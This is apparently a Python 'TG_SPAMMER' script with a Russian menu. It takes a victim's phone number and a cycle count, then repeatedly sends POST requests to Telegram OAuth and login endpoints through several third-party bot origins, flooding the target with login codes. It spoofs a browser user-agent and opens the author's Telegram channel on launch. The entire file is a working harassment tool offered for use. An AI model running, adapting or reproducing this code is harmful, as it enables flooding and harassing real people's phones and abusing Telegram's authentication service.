import requests
from fake_useragent import UserAgent
from pystyle import Colorate, Colors
import pystyle
import os
import webbrowser

banner = r"""
d888888b  d888b          .d8888. d8888b.  .d8b.  .88b  d88. .88b  d88. d88888b d8888b.
`~~88~~' 88' Y8b         88'  YP 88  `8D d8' `8b 88'YbdP`88 88'YbdP`88 88'     88  `8D
   88    88              `8bo.   88oodD' 88ooo88 88  88  88 88  88  88 88ooooo 88oobY'
   88    88  ooo           `Y8b. 88~~~   88~~~88 88  88  88 88  88  88 88~~~~~ 88`8b  
   88    88. ~8~         db   8D 88      88   88 88  88  88 88  88  88 88.     88 `88.
   YP     Y888P  C88888D `8888Y' 88      YP   YP YP  YP  YP YP  YP  YP Y88888P 88   YD"""
menu = r"""       
                      ╔══════════════════╦═════════╦═══════════╗
                      ║ 1 - Начать атаку ║ 2 - Тгк ║ 3 - Выход ║
                      ╚══════════════════╩═════════╩═══════════╝
                                    by @psyhodeat"""
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def fun():
    clear()
    print(Colorate.Horizontal(Colors.red_to_purple, banner, 1))

def enter():
    input(Colorate.Vertical(Colors.purple_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))

def spam_code():
    number = pystyle.Write.Input("\n[?] Введите номер телефона: >> ", pystyle.Colors.red_to_purple, interval=0.005)
    repeat = int(pystyle.Write.Input("\n[?] Введите количество циклов (1цикл = 10 кодов): >> ", pystyle.Colors.red_to_purple, interval=0.005))
    count = 0

    for _ in range(repeat):
        user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        headers = {'user-agent': user}

        requests.post(
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            headers=headers, data={'phone': number})
        requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
        requests.post('https://translations.telegram.org/auth/request', headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            headers=headers, data={'phone': number})
        requests.post(
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            headers=headers, data={'phone': number})
        requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': number})

        count += 1
        pystyle.Write.Print("\n" + "Коды успешно отправлены" + "\n", pystyle.Colors.purple_to_red, interval=0.005)
        pystyle.Write.Print(f"Всего циклов: {count} " + "\n", pystyle.Colors.purple_to_red, interval=0.005)
    input(Colorate.Vertical(Colors.cyan_to_blue, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))
    clear()

url = "https://t.me/psyhodeat_works"
webbrowser.open(url)

while True:
    print(Colorate.Horizontal(Colors.red_to_purple, banner, 1))
    print(Colorate.Horizontal(Colors.red_to_purple, menu, 1))

    choise = pystyle.Write.Input('>> ', pystyle.Colors.red_to_purple, interval=0.005)

    if choise == '1':
      fun()
      spam_code()
      clear()
    elif choise == '2':
      fun()
      url = "https://t.me/psyhodeat_works"
      webbrowser.open(url)
      print()
      pystyle.Write.Print(url, pystyle.Colors.purple_to_red, interval=0.005)
      print()
      enter()
      clear()
    elif choise == '3':
      break
    else:
       clear()
       continue